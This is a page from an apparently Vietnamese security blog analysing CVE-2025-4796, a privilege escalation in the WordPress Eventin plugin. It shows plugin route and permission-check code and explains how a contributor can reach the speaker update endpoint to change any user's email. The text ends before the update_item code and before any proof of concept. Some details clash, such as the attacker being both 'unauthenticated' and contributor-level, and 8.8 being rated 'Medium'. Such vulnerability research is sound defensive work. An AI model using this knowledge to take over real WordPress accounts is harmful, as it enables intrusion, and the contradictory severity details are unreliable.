<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="vi">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>CVE-2025-4796 Analysis &amp; POC - Bui Van Y</title><meta name="author" content="Bui Van Y">
<meta name="description" content="Security Vulnerability in WordPress Eventin Plugin."><meta name="keywords" content='analyst, plugin, privilege escalation'>
  <meta itemprop="name" content="CVE-2025-4796 Analysis & POC">
  <meta itemprop="description" content="Security Vulnerability in WordPress Eventin Plugin.">
  <meta itemprop="datePublished" content="2026-01-12T19:00:00+07:00">
  <meta itemprop="dateModified" content="2026-01-12T16:01:37+07:00">
  <meta itemprop="wordCount" content="2185">
  <meta itemprop="image" content="http://localhost:1313/posts/2026-01-12-cve-2025-4796/app.png">
  <meta itemprop="keywords" content="Analyst,Plugin,Privilege Escalation"><meta property="og:url" content="http://localhost:1313/vi/posts/2026-01-12-cve-2025-4796/">
  <meta property="og:site_name" content="Bui Van Y">
  <meta property="og:title" content="CVE-2025-4796 Analysis & POC">
  <meta property="og:description" content="Security Vulnerability in WordPress Eventin Plugin.">
  <meta property="og:locale" content="vi">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2026-01-12T19:00:00+07:00">
    <meta property="article:modified_time" content="2026-01-12T16:01:37+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Privilege Escalation">
    <meta property="og:image" content="http://localhost:1313/posts/2026-01-12-cve-2025-4796/app.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/2026-01-12-cve-2025-4796/app.png">
  <meta name="twitter:title" content="CVE-2025-4796 Analysis & POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress Eventin Plugin.">
<meta name="application-name" content="Bui Van Y">
<meta name="apple-mobile-web-app-title" content="Bui Van Y"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/svg-spinners--wind-toy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/vi/posts/2026-01-12-cve-2025-4796/" title="CVE-2025-4796 Analysis &amp; POC - Bui Van Y" /><link rel="prev" type="text/html" href="http://localhost:1313/vi/posts/2026-01-11-cve-2025-8059/" title="CVE-2025-8059 Analysis &amp; POC" /><link rel="next" type="text/html" href="http://localhost:1313/vi/posts/2026-01-13-cve-2025-6688/" title="CVE-2025-4796 Analysis &amp; POC" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/vi/posts/2026-01-12-cve-2025-4796/index.md" title="CVE-2025-4796 Analysis & POC - Bui Van Y"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "CVE-2025-4796 Analysis \u0026 POC",
    "inLanguage": "vi",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/vi\/posts\/2026-01-12-cve-2025-4796\/"
    },"image": ["http:\/\/localhost:1313\/images\/avatar.png"],"genre": "posts","keywords": "analyst, plugin, privilege escalation","wordcount":  2185 ,
    "url": "http:\/\/localhost:1313\/vi\/posts\/2026-01-12-cve-2025-4796\/","datePublished": "2026-01-12T19:00:00+07:00","dateModified": "2026-01-12T16:01:37+07:00","publisher": {
      "@type": "Organization",
      "name": "/images/avatar.png","logo": "http:\/\/localhost:1313\/images\/avatar.png"},"author": {
        "@type": "Person",
        "name": "Bui Van Y"
      },"description": "Security Vulnerability in WordPress Eventin Plugin."
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="32" width="32"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Tìm kiếm">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Xoá">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" role="button" aria-label="Đổi chủ đề" title="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></li><li class="menu-item language-switch">
            <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
            <ul class="sub-menu"><li class="menu-item"><a href="/posts/2026-01-12-cve-2025-4796/" class="menu-link" title="English">English</a></li><li class="menu-item"><span class="text-secondary" title="Vietnamese">Vietnamese</span></li></ul>
          </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/vi/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="26" width="26"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
      <div class="theme-switch" role="button" aria-label="Đổi chủ đề"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></div>
      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="Tìm tiêu đề hoặc nội dung..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Tìm kiếm">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Xoá">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              Huỷ
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/vi/posts/"><i class="fa-solid fa-file-alt fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/vi/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/vi/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system"><span class="menu-system-item language-switch">
              <span role="button" aria-label="Chọn Ngôn ngữ" title="Chọn Ngôn ngữ">Vietnamese<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
              <select id="language-select" class="language-select" onchange="location = this.value;"><option value="/posts/2026-01-12-cve-2025-4796/">English</option><option value="/vi/posts/2026-01-12-cve-2025-4796/" selected disabled>Vietnamese</option></select>
            </span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"><div class="details related-details open">
      <div class="details-summary related-summary">
        <i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden="true"></i>
        <span class="related-title">Nội dung liên quan</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
      <div class="details-content related-content">
        <ul class="related-list"><li class="related-item">
              <a href="/vi/posts/2026-01-11-cve-2025-8059/" title="CVE-2025-8059 Analysis &amp; POC">CVE-2025-8059 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-08-cve-2025-14156/" title="CVE-2025-2563 Analysis &amp; POC">CVE-2025-2563 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-07-cve-2025-2563/" title="CVE-2025-2563 Analysis &amp; POC">CVE-2025-2563 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-06-cve-2025-7654/" title="CVE-2025-7654 Analysis &amp; POC">CVE-2025-7654 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-05-cve-2025-55707/" title="CVE-2025-53425 Analysis &amp; POC">CVE-2025-53425 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-04-cve-2025-53425/" title="CVE-2025-53425 Analysis &amp; POC">CVE-2025-53425 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-03-cve-2025-6325/" title="CVE-2025-6325 Analysis &amp; POC">CVE-2025-6325 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-02-cve-2025-11923/" title="CVE-2025-11923 Analysis &amp; POC">CVE-2025-11923 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-01-cve-2025-11749/" title="CVE-2025-11749 Analysis &amp; POC">CVE-2025-11749 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/vi/posts/2026-01-14-cve-2025-3102/" title="CVE-2025-3102 Analysis &amp; POC">CVE-2025-3102 Analysis &amp; POC</a></li></ul>
      </div>
    </div></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>CVE-2025-4796 Analysis &amp; POC</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="github.com/w41bu1" title="Tác giả" rel=" author" class="author"><img class="avatar" src='/images/avatar.png' alt="Bui Van Y" height="16" width="16">&nbsp;Bui Van Y</a></span><span class="post-included-in">&nbsp;trong <a href="/vi/categories/cve-analysis/" class="post-category" title="Danh mục - CVE Analysis"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CVE Analysis</a></span></div><div class="post-meta-line"><span title="đăng ngày 2026-01-12 19:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2026-01-12">2026-01-12</time></span>&nbsp;<span title="Cập nhật ngày 2026-01-12 16:01:37"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2026-01-12">2026-01-12</time></span>&nbsp;<span title="2185 từ"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>Khoảng 2200 từ</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>11 phút</span>&nbsp;</div>
    </div><div class="featured-image"><img loading="eager" src='/posts/2026-01-12-cve-2025-4796/app.png' sizes="(max-width: 680px) 100vw, (max-width: 960px) 80vw, (max-width: 1440px) 56vw, 800px" alt="/posts/2026-01-12-cve-2025-4796/app.png" height="800" width="2470"></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Nội dung</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#analysis">Analysis</a></li>
    <li><a href="#flow">Flow</a></li>
    <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#key-takeaways">Key Takeaways</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h2 class="heading-element" id="cve--basic-info"><span>CVE &amp; Basic Info</span>
  <a href="#cve--basic-info" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Plugin <strong>Eventin</strong> cho WordPress <strong>dễ bị leo thang đặc quyền</strong> thông qua <strong>chiếm quyền tài khoản</strong> trong tất cả các phiên bản <strong>từ trước đến và bao gồm 4.0.34</strong>. Nguyên nhân là do plugin <strong>không xác thực đúng danh tính hoặc quyền hạn của người dùng</strong> trước khi cập nhật thông tin như <strong>email</strong> trong hàm <strong><code>Eventin\Speaker\Api\SpeakerController::update_item</code></strong>. Điều này cho phép <strong>kẻ tấn công chưa xác thực</strong> nhưng có <strong>quyền contributor trở lên</strong> có thể <strong>thay đổi địa chỉ email của bất kỳ người dùng nào</strong>, bao gồm cả <strong>quản trị viên</strong>, từ đó <strong>đặt lại mật khẩu</strong> và <strong>chiếm quyền truy cập tài khoản</strong>.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2025-4796" target="_blank" rel="external nofollow noopener noreferrer">CVE-2025-4796</a></li>
<li><strong>Vulnerability Type</strong>: Privilege Escalation</li>
<li><strong>Affected Versions</strong>: 4.0.34</li>
<li><strong>Patched Versions</strong>: 4.0.35</li>
<li><strong>CVSS severity</strong>: Medium (8.8)</li>
<li><strong>Required Privilege</strong>: Contributor</li>
<li><strong>Product</strong>: <a href="https://wordpress.org/plugins/wp-event-solution/" target="_blank" rel="external nofollow noopener noreferrer">WordPress Eventin Plugin</a></li>
</ul>
<h2 class="heading-element" id="requirements"><span>Requirements</span>
  <a href="#requirements" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li><strong>Local WordPress &amp; Debugging</strong>
<ul>
<li><a href="https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/" target="_blank" rel="external nofollow noopener noreferrer">Virtual Machine</a></li>
<li><a href="https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/" target="_blank" rel="external nofollow noopener noreferrer">Docker</a></li>
</ul>
</li>
<li><strong>Plugin Version</strong> - <strong>Eventin</strong>:
<ul>
<li><code>4.0.34</code> – <strong>vulnerable</strong></li>
<li><code>4.0.35</code> – <strong>patched</strong></li>
</ul>
</li>
<li><strong>Diff Tool (diff)</strong> → <a href="https://meldmerge.org/" target="_blank" rel="external nofollow noopener noreferrer"><strong>Meld</strong></a> hoặc bất kỳ công cụ diff nào.</li>
</ul>
<h2 class="heading-element" id="analysis"><span>Analysis</span>
  <a href="#analysis" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Plugin đã đăng ký một API như sau:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="SpeakerController.php v4.0.34" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">SpeakerController.php v4.0.34</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="hl"><span class="lnt">13
</span></span><span class="hl"><span class="lnt">14
</span></span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">register_rest_route</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">namespace</span><span class="p">,</span> <span class="c1">// &#39;eventin/v2&#39;
</span></span></span><span class="line"><span class="cl">    <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">rest_base</span> <span class="o">.</span> <span class="s1">&#39;/(?P&lt;id&gt;[\d]+)&#39;</span><span class="p">,</span> <span class="c1">// &#39;speakers&#39;
</span></span></span><span class="line"><span class="cl">    <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;args&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;id&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;description&#39;</span> <span class="o">=&gt;</span> <span class="nx">__</span><span class="p">(</span> <span class="s1">&#39;Unique identifier for the post.&#39;</span><span class="p">,</span> <span class="s1">&#39;eventin&#39;</span> <span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;type&#39;</span>        <span class="o">=&gt;</span> <span class="s1">&#39;integer&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;methods&#39;</span>             <span class="o">=&gt;</span> <span class="nx">WP_REST_Server</span><span class="o">::</span><span class="na">EDITABLE</span><span class="p">,</span> <span class="c1">// POST, PUT, PATCH
</span></span></span><span class="line hl"><span class="cl">            <span class="s1">&#39;callback&#39;</span>            <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span> <span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;update_item&#39;</span> <span class="p">),</span>
</span></span><span class="line hl"><span class="cl">            <span class="s1">&#39;permission_callback&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span> <span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;update_item_permissions_check&#39;</span> <span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;args&#39;</span>                <span class="o">=&gt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_collection_params</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">        <span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="p">);</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Mở rộng hoặc thu gọn khối mã" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>Với cấu hình trên:</p>
<ul>
<li><code>$this-&gt;namespace</code> = <strong><code>eventin/v2</code></strong></li>
<li><code>$this-&gt;rest_base</code> = <strong><code>speakers</code></strong></li>
<li><code>(?P&lt;id&gt;[\d]+)</code> = <strong>tham số ID dạng số</strong></li>
</ul>
<p>API endpoint đầy đủ sẽ có dạng:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/wp-json/eventin/v2/speakers/{id}</span></span></code></pre></td></tr></table></div>
</div>
</div><p>Khi có request đến endpoint trên với method hợp lệ thì callback <code>update_item</code> nhưng trước hết cần vượt qua hàm kiểm tra quyền <code>update_item_permissions_check</code></p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">update_item_permissions_check</span><span class="p">(</span> <span class="nv">$request</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">current_user_can</span><span class="p">(</span> <span class="s1">&#39;etn_manage_organizer&#39;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="o">||</span> <span class="nx">current_user_can</span><span class="p">(</span> <span class="s1">&#39;etn_manage_event&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Hàm sẽ cho phép request đi tiếp (<code>return true</code>) nếu user hiện tại có một trong hai quyền: <code>etn_manage_organizer</code> hoặc <code>etn_manage_event</code></p>
<p>Khi search với từ khóa <code>etn_manage_organizer</code></p>
<p><figure><a class="lightgallery" target="_blank" href="/posts/2026-01-12-cve-2025-4796/search.png" title="Search" data-thumbnail="/posts/2026-01-12-cve-2025-4796/search.png" data-sub-html="<h2>Search</h2><p>Search</p>"><img loading="lazy" src='/posts/2026-01-12-cve-2025-4796/search.png' alt="Search" height="870" width="1340"></a><figcaption class="image-caption">Search</figcaption>
  </figure></p>
<p>Ta thấy role contributor cũng được gán 2 quyền này</p>
<p>=&gt; Endpoint này dành cho người dùng có role <strong>Contributor</strong> trở lên.</p>
<p>Hàm <code>update_item</code> được gọi:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="SpeakerController.php v4.0.34" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">SpeakerController.php v4.0.34</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="hl"><span class="lnt"> 2
</span></span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="hl"><span class="lnt">12
</span></span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">update_item</span><span class="p">(</span> <span class="nv">$request</span> <span class="p">)</span> <span class="p">{</span>
